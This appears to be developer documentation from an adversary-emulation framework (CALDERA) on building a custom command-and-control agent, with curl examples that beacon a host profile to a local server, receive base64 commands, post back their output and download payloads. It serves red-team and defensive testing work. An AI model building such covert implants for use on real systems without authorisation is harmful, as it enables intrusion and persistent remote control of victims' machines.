How to Build Agents
================

Building your own agent is a way to create a unique - or undetectable - footprint on compromised machines. Our
default agent, 54ndc47, is a full representation of what an agent can do. This agent is written in GoLang and offers
an extensible collection of command-and-control (C2) protocols, such as communicating over HTTP or GitHub Gist. You can
extend 54ndc47 by adding your own C2 protocols in place or you can follow this guide to create your own agent 
from scratch.

## Types of agents

There are 2 unique types of agents. Determining which one you want is your first step:

1) Direct communication between agent-and-server. HTTP communication is an example.
2) Indirect communication between agent-and-server. Using a trusted 3rd party, like GitHub Gists, is an example.

## Building a direct agent

Start by getting a feel for the HTTP(S) agent endpoints, which are located in the rest_api.py module.
```
POST  /beacon 
POST  /result
```
### Part #1

Start by writing a POST request to the /beacon endpoint. 

In your agent code, create a flat JSON dictionary of key/value pairs and ensure the following properties are included
as keys. Add values which correlate to the host your agent will be running on. Note - all of these properties are
optional - but you should aim to cover as many as you can.

| Key           | Value  | Notes |
| :------------- |:------------- |:-------------|  
| server        | The location (IP or FQDN) of the C2 server    | |
| platform      | The operating system | The platform is evaluated against the platform field of each ability. Currently you can use windows, darwin or linux |
| host          | The hostname of the machine | |
| username      | The username running the agent | |
| architecture  | The architecture of the host. | |
| executors     | A list of executors allowed on the host | Executors are evaluated against the executor block of each ability. Currently, you can use sh, cmd, psh and pwsh |
| privilege     | The privilege level of the agent process, either User or Elevated | Privilege is evaluated against the optional privilege block of each ability file |
| pid           | The process identifier of the agent | |
| location      | The location of the agent on disk | |
| exe_name      | The name of the agent binary file | |

At this point, you are ready to make a POST request with the profile to the /beacon endpoint. You should get back:

1) The recommended number of seconds to sleep before sending the next beacon
2) The recommended number of minutes (watchdog) to wait before killing the agent, once the server is unreachable (0 means infinite)
3) A list of instructions - base64 encoded - which will be empty.
```
profile=$(echo '{"server":"http://127.0.0.1:8888","platform":"darwin","executors":["sh"]}' | base64)
curl -s -X POST -d $profile localhost:8888/beacon | base64 --decode
...{"paw": "dcoify", sleep": 59, "watchdog": 0, "instructions": "[]"}
```

> The paw property returned back from the server. This represents a unique identifier for your new agent. Each
time you call the /beacon endpoint without this paw, a new agent will be created on the server - so you should ensure
that future beacons include it.

You can now navigate to the CALDERA UI, click into the agents tab and view your new agent. 

### Part #2

Start an operation against your agent, selecting to keep the operation alive forever. 

> If you did not include a platform or executors then the operation will not be able to assign abilities to the agent. 

Re-run the call to /beacon as above, this time including your paw:
```
profile=$(echo '{"paw":"dcoify"}' | base64)
curl -s -X POST -d $profile localhost:8888/beacon | base64 --decode
...{"paw": "dcoify", sleep": 24, "watchdog": 0, "instructions": "[
    {"id":"110300-895546","sleep":6,"command":"ZmluZCAvVXNlcnM...", "executor":"sh", "timeout :60, "payload":""},
    ...
    ...
]"}
```

You should get a full list of instructions, each containing:

* **id**: The link ID associated to the ability
* **sleep**: A recommended pause to take after running this instruction
* **command**: A base64 encoded command to run
* **executor**: The executor to run the command under
* **timeout**: How long to let the command run before timing it out
* **payload**: A payload file name which must be downloaded before running the command, if applicable

Now, you'll want to revise your agent to loop through all the instructions, executing each command
and POSTing the shell response to the /result endpoint. 
```
data=$(echo '{"id":$id, "output":$output, "status": $status, "pid":$pid}' | base64)
curl -s -X POST -d $data localhost:8888/result
```

The POST details are as follows:

* **id**: the ID of the instruction you received
* **output**: the base64 encoded output from running the instruction
* **status**: the status code from running the instruction. If unsure, put 0.
* **pid**: the process identifier the instruction ran under. If unsure, put 0.

Once all instructions are run, the agent should sleep for the specified time in the beacon before calling the /beacon 
endpoint again. This process should repeat forever. 

### Part #3

Inside each instruction, there is an optional *payload* property that contains a filename of a file to download
before running the instruction. To implement this, add a file download capability to your agent, directing it to
the /file/download endpoint to retrieve the file:
```
payload='some_file_name.txt"
curl -X POST -H "file:$payload" http://localhost:8888/file/download > some_file_name.txt
```

### Part #4

You should implement the watchdog configuration. This property, passed to the agent in every beacon, contains
the number of minutes to allow a dead beacon before killing the agent. 


